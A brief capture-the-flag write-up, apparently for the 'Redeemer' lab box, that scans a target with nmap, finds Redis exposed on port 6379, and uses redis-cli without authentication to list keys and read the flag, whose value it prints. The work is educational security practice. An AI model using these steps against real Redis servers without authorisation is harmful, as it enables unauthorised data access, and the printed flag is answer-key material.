# Redeemer

#redis #vulnerabilityassessment #databases #reconnaissance #anonymous/guestaccess 

`nmap` scan shows `redis` running on port 6379:

```
$ nmap -p- -sV 10.129.216.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 08:23 EDT
Nmap scan report for 10.129.216.4
Host is up (0.22s latency),
Not shown: 65534 closed tcp ports (conn-refused)

PORT     STATE SERVICE 
6379/tcp open  redis   Redis key-value store 5.0.7
```

Connecting to the database via `redis-cli` and running `info`:

```
$ redis-cli -h 10.129.216.4
10.129.216.4:6379> info
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Getting all the keys:

```
10.129.216.4:6379> keys *
1) "temp"
2) "stor"
3) "flag"
4) "numb"
(0.52s)
```

Getting the `flag` key:

```
10.129.216.4:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

